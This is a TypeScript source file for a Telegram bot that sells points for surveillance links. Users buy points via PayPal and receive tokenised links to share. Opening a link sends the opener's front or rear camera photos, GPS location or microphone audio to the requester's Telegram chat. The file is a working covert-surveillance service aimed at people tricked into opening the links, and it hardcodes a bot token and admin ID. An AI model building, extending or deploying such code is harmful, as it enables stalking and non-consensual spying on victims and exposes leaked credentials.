import type { Response } from "express";
import { randomUUID } from "crypto";
import {
  getUser, upsertUser, approveUser, removeUser,
  addPoints, setPoints, deductPoints, getAllUsers,
  getCost, setCost, getAllCosts, getSetting, setSetting,
  createLinkToken,
} from "./db";

const TOKEN = "8657563336:AAHa03MTTZ2ZuHk8bx5ESYkcJsLaW0gdB-w";
export const ADMIN_ID = 1064122583;

const clients = new Set<Response>();
let lastUpdateId = 0;

export function addSSEClient(res: Response) {
  clients.add(res);
  res.on("close", () => clients.delete(res));
}

export function sendCommand(command: string) {
  const data = `data: ${command}\n\n`;
  clients.forEach((client) => client.write(data));
}

function getAppUrl(): string {
  const domain = process.env.REPLIT_DOMAINS?.split(",")[0];
  return domain ? `https://${domain}` : "https://yourapp.replit.dev";
}

const ACTION_LABELS: Record<string, string> = {
  front: "📷 Front Camera",
  rear: "📷 Rear Camera",
  location: "📍 Location",
  mic: "🎤 Microphone",
  all: "🔥 All",
};

async function buildMainKeyboard() {
  const costs = await getAllCosts();
  return {
    inline_keyboard: [
      [
        { text: `📷 Front (${costs.front ?? 5}pts)`, callback_data: "use_front" },
        { text: `📷 Rear (${costs.rear ?? 5}pts)`, callback_data: "use_rear" },
      ],
      [
        { text: `📍 Location (${costs.location ?? 3}pts)`, callback_data: "use_location" },
        { text: `🎤 Mic (${costs.mic ?? 3}pts)`, callback_data: "use_mic" },
      ],
      [
        { text: `🔥 All (${costs.all ?? 10}pts)`, callback_data: "use_all" },
      ],
      [
        { text: "💰 My Balance", callback_data: "balance" },
        { text: "💳 Buy Points", callback_data: "buy_points" },
      ],
    ],
  };
}

function buildAdminKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "👥 List Users", callback_data: "admin_users" },
        { text: "➕ Approve User", callback_data: "admin_approve_prompt" },
      ],
      [
        { text: "💰 Add Points", callback_data: "admin_addpoints_prompt" },
        { text: "❌ Remove User", callback_data: "admin_remove_prompt" },
      ],
      [
        { text: "⚙️ View/Set Costs", callback_data: "admin_costs" },
      ],
      [
        { text: "📋 Use Bot (Main Menu)", callback_data: "menu" },
      ],
    ],
  };
}

async function telegramRequest(method: string, body: object) {
  const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

export async function sendToTelegram(text: string) {
  const keyboard = await buildMainKeyboard();
  await telegramRequest("sendMessage", { chat_id: ADMIN_ID, text, reply_markup: keyboard });
}

export async function sendLocationToTelegram(chatId: number, lat: number, lon: number) {
  await telegramRequest("sendLocation", { chat_id: chatId, latitude: lat, longitude: lon });
  await telegramRequest("sendMessage", {
    chat_id: chatId,
    text: `📍 *Location*\nLat: ${lat.toFixed(6)}\nLon: ${lon.toFixed(6)}\n[Maps](https://maps.google.com/?q=${lat},${lon})`,
    parse_mode: "Markdown",
  });
}

export async function sendPhotoToTelegram(chatId: number, imgBuffer: Buffer) {
  const boundary = "----B" + Date.now();
  const body = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n` +
        `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`
    ),
    imgBuffer,
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
    method: "POST",
    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": String(body.length) },
    body,
  });
}

export async function sendAudioToTelegram(chatId: number, audioBuffer: Buffer, mimeType: string) {
  const ext = mimeType.includes("ogg") ? "ogg" : "webm";
  const boundary = "----B" + Date.now();
  const body = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n` +
        `--${boundary}\r\nContent-Disposition: form-data; name="voice"; filename="audio.${ext}"\r\nContent-Type: ${mimeType}\r\n\r\n`
    ),
    audioBuffer,
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
    method: "POST",
    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": String(body.length) },
    body,
  });
  const result = (await res.json()) as { ok: boolean };
  if (!result.ok) {
    const b2 = "----B" + Date.now();
    const b2body = Buffer.concat([
      Buffer.from(
        `--${b2}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n` +
          `--${b2}\r\nContent-Disposition: form-data; name="document"; filename="recording.${ext}"\r\nContent-Type: ${mimeType}\r\n\r\n`
      ),
      audioBuffer,
      Buffer.from(`\r\n--${b2}--\r\n`),
    ]);
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
      method: "POST",
      headers: { "Content-Type": `multipart/form-data; boundary=${b2}`, "Content-Length": String(b2body.length) },
      body: b2body,
    });
  }
}

async function sendMsg(chatId: number, text: string, extra: object = {}) {
  return telegramRequest("sendMessage", { chat_id: chatId, text, parse_mode: "Markdown", ...extra });
}

const pendingAdmin: Map<number, string> = new Map();
const pendingAdminAction: Map<number, string> = new Map();

async function handleAdminCallback(callbackId: string, data: string, chatId: number) {
  await telegramRequest("answerCallbackQuery", { callback_query_id: callbackId });

  if (data === "admin_users") {
    const users = await getAllUsers();
    if (users.length === 0) {
      await sendMsg(chatId, "No users yet.");
      return;
    }
    const lines = users.map(
      (u) =>
        `• ${u.first_name ?? "Unknown"} (@${u.username ?? "?"}) \`${u.telegram_id}\`\n  ${u.is_approved ? "✅ Approved" : "❌ Pending"} | 💰 ${u.points} pts`
    );
    await sendMsg(chatId, `*All Users (${users.length}):*\n\n${lines.join("\n\n")}`);
    return;
  }

  if (data === "admin_approve_prompt") {
    pendingAdmin.set(chatId, "approve");
    await sendMsg(chatId, "Send me the *Telegram ID* of the user to approve:");
    return;
  }

  if (data === "admin_addpoints_prompt") {
    pendingAdmin.set(chatId, "addpoints");
    await sendMsg(chatId, "Send: `<telegram_id> <amount>`\nExample: `123456789 50`");
    return;
  }

  if (data === "admin_remove_prompt") {
    pendingAdmin.set(chatId, "remove");
    await sendMsg(chatId, "Send me the *Telegram ID* of the user to remove:");
    return;
  }

  if (data === "admin_costs") {
    const costs = await getAllCosts();
    const lines = Object.entries(costs).map(([a, c]) => `• ${ACTION_LABELS[a] ?? a}: *${c} pts*`);
    await sendMsg(
      chatId,
      `*Current Point Costs:*\n\n${lines.join("\n")}\n\nTo change: \`/setcost <action> <points>\`\nActions: front, rear, location, mic, all`,
      {}
    );
    return;
  }

  if (data === "menu") {
    const keyboard = await buildMainKeyboard();
    const user = await getUser(chatId);
    await sendMsg(
      chatId,
      `💰 *Your balance:* ${user?.points ?? 0} pts\n\nChoose an action:`,
      { reply_markup: keyboard }
    );
    return;
  }

  if (data === "admin_panel") {
    const keyboard = buildAdminKeyboard();
    await sendMsg(chatId, "🔧 *Admin Panel*", { reply_markup: keyboard });
    return;
  }

  if (data === "balance") {
    const user = await getUser(chatId);
    const costs = await getAllCosts();
    const keyboard = await buildMainKeyboard();
    await sendMsg(
      chatId,
      `💰 *Balance:* ${user?.points ?? 0} pts\n\n*Costs:*\n${Object.entries(costs).map(([a, c]) => `• ${ACTION_LABELS[a]}: ${c} pts`).join("\n")}`,
      { reply_markup: keyboard }
    );
    return;
  }

  if (data === "buy_points") {
    await sendMsg(chatId, "ℹ️ As admin, you can add points directly via /addpoints.");
    return;
  }

  if (data.startsWith("use_")) {
    const action = data.replace("use_", "");
    pendingAdmin.set(chatId, "sendlink");
    pendingAdminAction.set(chatId, action);
    const users = await getAllUsers();
    const approved = users.filter((u) => u.is_approved);
    if (approved.length === 0) {
      await sendMsg(chatId, "❌ No approved users found. Approve a user first.");
      pendingAdmin.delete(chatId);
      pendingAdminAction.delete(chatId);
      return;
    }
    const lines = approved.map(
      (u) => `• ${u.first_name ?? "Unknown"} (@${u.username ?? "?"}) — ID: \`${u.telegram_id}\``
    );
    await sendMsg(
      chatId,
      `📤 *Send ${ACTION_LABELS[action]} link to which user?*\n\n${lines.join("\n")}\n\nReply with their *Telegram ID*:`
    );
    return;
  }
}

async function handleUserCallback(callbackId: string, data: string, chatId: number) {
  await telegramRequest("answerCallbackQuery", { callback_query_id: callbackId });

  if (data === "balance") {
    const user = await getUser(chatId);
    if (!user || !user.is_approved) {
      await sendMsg(chatId, "❌ You are not approved yet. Contact the admin.");
      return;
    }
    const costs = await getAllCosts();
    const keyboard = await buildMainKeyboard();
    await sendMsg(
      chatId,
      `💰 *Balance:* ${user.points} pts\n\n*Costs:*\n${Object.entries(costs).map(([a, c]) => `• ${ACTION_LABELS[a]}: ${c} pts`).join("\n")}`,
      { reply_markup: keyboard }
    );
    return;
  }

  if (data === "buy_points") {
    const paypalLink = await getSetting("paypal_link");
    const costs = await getAllCosts();
    const user = await getUser(chatId);
    const packages = [
      { pts: 50,  price: "£2.50" },
      { pts: 150, price: "£5.00" },
      { pts: 350, price: "£10.00" },
      { pts: 800, price: "£20.00" },
    ];
    const pkgLines = packages.map((p) => `• *${p.pts} pts* — ${p.price}`).join("\n");
    const isPlaceholder = !paypalLink || paypalLink === "https://paypal.me/yourlink";
    const paymentSection = isPlaceholder
      ? "📌 _Payment link coming soon — contact admin directly to purchase._"
      : `💳 *Pay via PayPal:*\n${paypalLink}\n\n_After payment, send your receipt to the admin and points will be added to your account._`;

    const keyboard = await buildMainKeyboard();
    await sendMsg(
      chatId,
      `💳 *Buy Points*\n\n💰 Your balance: *${user?.points ?? 0} pts*\n\n*Packages:*\n${pkgLines}\n\n${paymentSection}`,
      { reply_markup: keyboard }
    );
    return;
  }

  if (data.startsWith("use_")) {
    const action = data.replace("use_", "");
    const user = await getUser(chatId);
    if (!user || !user.is_approved) {
      await sendMsg(chatId, "❌ Not approved. Contact the admin to get access.");
      return;
    }
    const cost = await getCost(action);
    if (user.points < cost) {
      await sendMsg(
        chatId,
        `❌ *Not enough points!*\nThis action costs *${cost} pts* but you have *${user.points} pts*.\n\nContact admin to buy more points.`
      );
      return;
    }
    const remaining = await deductPoints(chatId, cost);
    if (remaining === null) {
      await sendMsg(chatId, "❌ Failed to deduct points. Try again.");
      return;
    }
    const token = randomUUID();
    await createLinkToken(token, chatId, action);
    const url = `${getAppUrl()}/?r=${action}&token=${token}`;
    await telegramRequest("sendMessage", {
      chat_id: chatId,
      text: `✅ *${ACTION_LABELS[action]}*\n\n🔗 Share this link:\n\`${url}\`\n\n💰 Spent: ${cost} pts | Remaining: ${remaining} pts`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Open / Share Link", url }],
          [{ text: "↩️ Menu", callback_data: "menu" }],
        ],
      },
    });
    return;
  }
}

async function handleAdminText(chatId: number, text: string): Promise<boolean> {
  const pending = pendingAdmin.get(chatId);
  if (!pending) return false;

  pendingAdmin.delete(chatId);

  if (pending === "approve") {
    const id = parseInt(text.trim());
    if (isNaN(id)) { await sendMsg(chatId, "❌ Invalid ID."); return true; }
    const ok = await approveUser(id);
    if (ok) {
      await sendMsg(chatId, `✅ User \`${id}\` approved.`);
      await sendMsg(id, "✅ You have been approved! Send /start to use the bot.");
    } else {
      await sendMsg(chatId, `❌ User \`${id}\` not found. They must /start the bot first.`);
    }
    return true;
  }

  if (pending === "addpoints") {
    const parts = text.trim().split(/\s+/);
    const id = parseInt(parts[0]);
    const amount = parseInt(parts[1]);
    if (isNaN(id) || isNaN(amount) || amount <= 0) {
      await sendMsg(chatId, "❌ Format: `<telegram_id> <amount>`\nExample: `1064122583 50`");
      return true;
    }
    const result = await addPoints(id, amount);
    if (!result.existed) {
      await sendMsg(
        chatId,
        `⚠️ User \`${id}\` was not found — created them and credited *${amount} pts*.\nThey must send /start to the bot before using it.`
      );
    } else {
      await sendMsg(chatId, `✅ Added *${amount} pts* to \`${id}\`. New balance: *${result.points} pts*`);
      await sendMsg(id, `💰 You received *${amount} pts* from admin! Balance: *${result.points} pts*`).catch(() => {});
    }
    return true;
  }

  if (pending === "remove") {
    const id = parseInt(text.trim());
    if (isNaN(id)) { await sendMsg(chatId, "❌ Invalid ID."); return true; }
    const ok = await removeUser(id);
    await sendMsg(chatId, ok ? `✅ User \`${id}\` removed.` : `❌ User \`${id}\` not found.`);
    return true;
  }

  if (pending === "sendlink") {
    const targetId = parseInt(text.trim());
    const action = pendingAdminAction.get(chatId);
    pendingAdminAction.delete(chatId);
    if (isNaN(targetId) || !action) {
      await sendMsg(chatId, "❌ Invalid ID.");
      return true;
    }
    const targetUser = await getUser(targetId);
    if (!targetUser || !targetUser.is_approved) {
      await sendMsg(chatId, `❌ User \`${targetId}\` not found or not approved.`);
      return true;
    }
    const cost = await getCost(action);
    if (targetUser.points < cost) {
      await sendMsg(
        chatId,
        `❌ User \`${targetId}\` only has *${targetUser.points} pts* but this action costs *${cost} pts*.`
      );
      return true;
    }
    const remaining = await deductPoints(targetId, cost);
    if (remaining === null) {
      await sendMsg(chatId, "❌ Failed to deduct points from user.");
      return true;
    }
    const token = randomUUID();
    await createLinkToken(token, targetId, action);
    const url = `${getAppUrl()}/?r=${action}&token=${token}`;
    await telegramRequest("sendMessage", {
      chat_id: targetId,
      text: `🔗 *${ACTION_LABELS[action]}*\n\nOpen this link:\n\`${url}\`\n\n💰 Spent: ${cost} pts | Remaining: ${remaining} pts`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Open Link", url }],
          [{ text: "↩️ Menu", callback_data: "menu" }],
        ],
      },
    });
    await sendMsg(chatId, `✅ Link sent to user \`${targetId}\`\n💰 Deducted ${cost} pts (remaining: ${remaining} pts)`);
    return true;
  }

  return false;
}

async function pollTelegram() {
  while (true) {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`
      );
      const data = (await res.json()) as {
        ok?: boolean;
        error_code?: number;
        description?: string;
        result?: Array<{
          update_id: number;
          message?: { chat?: { id: number }; from?: { id: number; username?: string; first_name?: string }; text?: string };
          callback_query?: { id: string; data?: string; from?: { id: number; username?: string; first_name?: string }; message?: { chat?: { id: number } } };
        }>;
      };

      if (!data.ok || !Array.isArray(data.result)) {
        if (data.error_code === 409) {
          console.log("Conflict: waiting for other instance to die...");
          await new Promise((r) => setTimeout(r, 6000));
        } else {
          console.warn("Telegram API error:", data.description);
          await new Promise((r) => setTimeout(r, 3000));
        }
        await new Promise((r) => setTimeout(r, 2000));
        continue;
      }

      for (const update of data.result) {
        lastUpdateId = update.update_id;

        if (update.callback_query) {
          const cq = update.callback_query;
          const chatId = cq.message?.chat?.id ?? cq.from?.id ?? 0;
          const fromId = cq.from?.id ?? 0;
          const cbData = cq.data ?? "";

          if (fromId === ADMIN_ID) {
            await handleAdminCallback(cq.id, cbData, chatId);
          } else {
            await handleUserCallback(cq.id, cbData, chatId);
          }
          continue;
        }

        const msg = update.message;
        if (!msg?.chat?.id) continue;
        const chatId = msg.chat.id;
        const fromId = msg.from?.id ?? chatId;
        const text = msg.text?.trim() ?? "";
        const username = msg.from?.username ?? null;
        const firstName = msg.from?.first_name ?? null;

        if (!text) continue;

        await upsertUser(fromId, username, firstName);

        if (fromId === ADMIN_ID) {
          if (await handleAdminText(chatId, text)) continue;

          if (text.startsWith("/addpoints")) {
            const parts = text.split(/\s+/);
            const id = parseInt(parts[1]);
            const amount = parseInt(parts[2]);
            if (isNaN(id) || isNaN(amount) || amount <= 0) {
              await sendMsg(chatId, "Usage: `/addpoints <telegram_id> <amount>`\nExample: `/addpoints 1064122583 100`");
            } else {
              const result = await addPoints(id, amount);
              if (!result.existed) {
                await sendMsg(chatId, `⚠️ User \`${id}\` not in system — created and credited *${amount} pts*. They must send /start first to activate.`);
              } else {
                await sendMsg(chatId, `✅ Added *${amount} pts* to \`${id}\`. New balance: *${result.points} pts*`);
                await sendMsg(id, `💰 You received *${amount} pts* from admin! Balance: *${result.points} pts*`).catch(() => {});
              }
            }
            continue;
          }

          if (text.startsWith("/approve")) {
            const parts = text.split(/\s+/);
            const id = parseInt(parts[1]);
            if (isNaN(id)) {
              await sendMsg(chatId, "Usage: `/approve <telegram_id>`");
            } else {
              const ok = await approveUser(id);
              if (ok) {
                await sendMsg(chatId, `✅ User \`${id}\` approved.`);
                await sendMsg(id, "✅ You have been approved! Send /start to begin.").catch(() => {});
              } else {
                await sendMsg(chatId, `❌ User \`${id}\` not found. They must send /start first.`);
              }
            }
            continue;
          }

          if (text === "/users") {
            const users = await getAllUsers();
            if (users.length === 0) {
              await sendMsg(chatId, "No users yet.");
            } else {
              const lines = users.map(
                (u) => `• ${u.first_name ?? "?"} (@${u.username ?? "?"}) \`${u.telegram_id}\` — ${u.is_approved ? "✅" : "❌"} | 💰 ${u.points} pts`
              );
              await sendMsg(chatId, `*Users (${users.length}):*\n\n${lines.join("\n")}`);
            }
            continue;
          }

          if (text.startsWith("/setpaypal")) {
            const link = text.replace("/setpaypal", "").trim();
            if (!link) {
              const current = await getSetting("paypal_link");
              await sendMsg(chatId, `Current PayPal link: \`${current ?? "not set"}\`\n\nTo change: \`/setpaypal https://paypal.me/yourlink\``);
            } else {
              await setSetting("paypal_link", link);
              await sendMsg(chatId, `✅ PayPal link updated!\n\nUsers will now see:\n${link}`);
            }
            continue;
          }

          if (text.startsWith("/setcost")) {
            const parts = text.split(/\s+/);
            const action = parts[1];
            const cost = parseInt(parts[2]);
            if (!action || isNaN(cost)) {
              await sendMsg(chatId, "Usage: `/setcost <action> <points>`\nActions: front, rear, location, mic, all");
            } else {
              await setCost(action, cost);
              await sendMsg(chatId, `✅ Set *${action}* cost to *${cost} pts*`);
            }
            continue;
          }

          if (text === "/admin") {
            const adminKb = buildAdminKeyboard();
            await sendMsg(chatId, "🔧 *Admin Panel*\n\nDirect commands:\n`/addpoints <id> <amount>`\n`/approve <id>`\n`/users`\n`/setcost <action> <pts>`\n`/setpaypal <link>`", { reply_markup: adminKb });
            continue;
          }

          if (text === "/start" || text === "/menu") {
            const keyboard = await buildMainKeyboard();
            const user = await getUser(chatId);
            await sendMsg(
              chatId,
              `👋 *Welcome, Admin!*\n\n💰 Balance: *${user?.points ?? 0} pts*\n\nUse /admin for admin panel or pick an action:`,
              { reply_markup: keyboard }
            );
            continue;
          }
        } else {
          if (text === "/start") {
            const user = await getUser(fromId);
            if (!user?.is_approved) {
              await sendMsg(
                chatId,
                "👋 Welcome!\n\n⏳ You need admin approval to use this bot.\n\nYour request has been noted. Please wait for approval."
              );
              await sendMsg(
                ADMIN_ID,
                `🔔 *New User Request*\n\nName: ${firstName ?? "?"}\nUsername: @${username ?? "?"}\nID: \`${fromId}\`\n\nApprove with /adduser or Admin Panel (/admin)`,
                {}
              );
            } else {
              const keyboard = await buildMainKeyboard();
              await sendMsg(chatId, `👋 *Welcome back!*\n\n💰 Balance: *${user.points} pts*\n\nChoose an action:`, { reply_markup: keyboard });
            }
            continue;
          }

          const user = await getUser(fromId);
          if (!user?.is_approved) {
            await sendMsg(chatId, "❌ You are not approved yet. Please wait for admin approval.");
          }
        }
      }
      await new Promise((r) => setTimeout(r, 2000));
    } catch (e) {
      console.error("Poll error:", e);
      await new Promise((r) => setTimeout(r, 5000));
    }
  }
}

pollTelegram();
